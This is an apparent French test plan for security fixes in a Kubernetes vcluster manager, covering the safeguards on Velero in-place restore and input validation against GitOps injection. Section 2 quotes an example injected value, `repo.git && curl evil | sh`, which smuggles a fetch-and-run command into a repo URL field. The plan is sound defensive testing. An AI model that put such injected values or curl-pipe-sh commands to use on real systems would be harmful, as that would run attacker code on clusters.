# Recette — sécurité & data-safety (increment 1)

> Plan de recette des correctifs de sécurité/data-safety portés sur `main` via la branche
> `feat/securite-recette`. Se déroule sur l'infra de test `vcluster-manager-infra`
> (K3s + FluxCD + Keycloak + Vault + Rancher + Velero/MinIO sur Hetzner).
> Les opérations destructives se recettent sur un **vcluster jetable**, jamais sur un vcluster utile.

## Prérequis
- Infra `vcluster-manager-infra` déployée, app `vcluster-manager` en marche (image `ghcr.io/gmalfray/vcluster-manager:latest`), fluxprod seedé.
- Un compte admin (groupe Keycloak admin) et un compte lecteur (non-admin) pour les tests RBAC.
- Build de référence :
  ```bash
  docker run --rm -v "$PWD":/app -w /app -e GOCACHE=/tmp/gocache -e GOMODCACHE=/tmp/gomod \
    -e GOFLAGS=-mod=mod golang:1.25-alpine sh -c 'go build ./... && go vet ./... && go test ./...'
  ```

---

## 1. ⚠️ Restore Velero in-place — garde-fous data-safety

**Ce qui a été corrigé** (`internal/handlers/api_velero.go`, `internal/kubernetes/velero.go`). Le restore
in-place avait trois failles de perte de données : suppression de la PVC sans vérifier que le backup est
restaurable, `time.Sleep(5s)` en dur au lieu d'attendre la libération réelle du volume, reprise de Flux
dépendante du polling HTMX (navigateur fermé = vcluster reste éteint). Corrections : pré-check de phase
`GetVeleroBackupPhase` → abandon **avant** tout scale/suppression si ≠ `Completed` ; `WaitForVClusterPodGone`
avant `DeleteVClusterPVC` ; goroutine serveur `resumeAfterInPlaceRestore` (timeout 2 h) qui reprend Flux
indépendamment du navigateur.

**À recetter sur un vcluster jetable :**
- [ ] Créer un vcluster jetable, y écrire une donnée témoin identifiable.
- [ ] Déclencher un backup, attendre la phase `Completed`.
- [ ] **Cas nominal** : restore in-place → StatefulSet scale à 0 → pod disparu (pas juste 5 s) → PVC supprimée → restore → Flux repris → **donnée témoin présente**.
- [ ] **Cas backup non restaurable** : lancer un restore in-place sur un backup `PartiallyFailed`/`InProgress` → le pré-check **abandonne avant de toucher la PVC** (aucun scale, aucune suppression). PVC d'origine intacte.
- [ ] **Cas navigateur fermé** : lancer un restore in-place, **fermer l'onglet** aussitôt. Vérifier que la goroutine serveur reprend Flux et que le vcluster remonte sans intervention (indépendant du polling).
- [ ] **FSB actif** : confirmer que le node-agent Velero tourne (l'app sauvegarde avec `defaultVolumesToFsBackup: true` — sans node-agent, le contenu du volume n'est pas capturé et la donnée témoin serait perdue même en cas nominal). Voir `vcluster-manager-infra` (Velero géré par Flux, `deployNodeAgent: true`).

---

## 2. Validation anti-injection GitOps

**Ce qui a été corrigé** (`internal/handlers/validate.go`, appliqué dans `vcluster.go`, `settings.go`,
`handlers.go`). Les champs libres committés dans fluxprod étaient interpolés sans validation ni échappement.
Point le plus grave trouvé : `FluxCDRepoURL`/`Branch`/`Path` étaient interpolés dans une **commande shell**
(`flux bootstrap git --url=…`) exécutée dans un pod — une valeur comme `repo.git && curl evil | sh`
s'exécutait. `K8sVersion`/`ArgoCDVersion`/`CPU`/`Memory`/`Storage` étaient interpolés bruts dans le YAML.
`UpdateVeleroConfig` construisait son `values.yaml` par `fmt.Sprintf` → remplacé par `yaml.Marshal`.

**À recetter (compte admin) :**
- [ ] Création vcluster avec un `FluxCDRepoURL` contenant `&&`, `;`, `|`, ou une URL malformée → **rejeté en 400**, rien de committé, aucun pod flux-bootstrap lancé.
- [ ] Réglages avec `CPU`/`Memory`/`Storage` hors format quantité K8s, ou une version absurde → rejeté.
- [ ] Config Velero avec un `bucket`/`s3URL` contenant `"` ou `\n` → rejeté, aucun YAML cassé dans fluxprod.
- [ ] Non-régression : valeurs légitimes (`ssh://git@…`, `2Gi`, `v1.31.1`, TTL `720h`) toujours acceptées.

---

## 3. Durcissements ciblés
- [ ] `DownloadKubeconfig` : un `name` mal formé (majuscule, `/`, `..`) → 400 avant tout appel k8s.
- [ ] Contenu/suppression de backup avec un nom de backup mal formé → rejeté.
- [ ] `govulncheck ./...` : **0 vulnérabilité atteignable** (deps bumpées : x/text 0.39, x/net 0.55, x/crypto 0.52, spdystream 0.5.1, go-jose 4.1.4).

---

## Point connu à traiter séparément (hors périmètre sécurité)
- **Toggle ArgoCD efface la config FluxCD** : dans `settings.go`, `UpdateSettings` reconstruit la requête de création sans recopier les champs FluxCD (contrairement au toggle FluxCD qui recopie bien ArgoCD). Bug préexistant → un vcluster avec Flux activé perd sa config Flux en basculant ArgoCD. À corriger dans une passe dédiée, avec un test de non-régression.

---

## Porte de sortie
- [ ] Build + vet + tests verts, govulncheck à 0.
- [ ] Restore Velero in-place recetté (3 cas) sur vcluster jetable.
- [ ] Injections GitOps rejetées, valeurs légitimes acceptées.
- [ ] Bug toggle ArgoCD tracé pour une passe séparée.
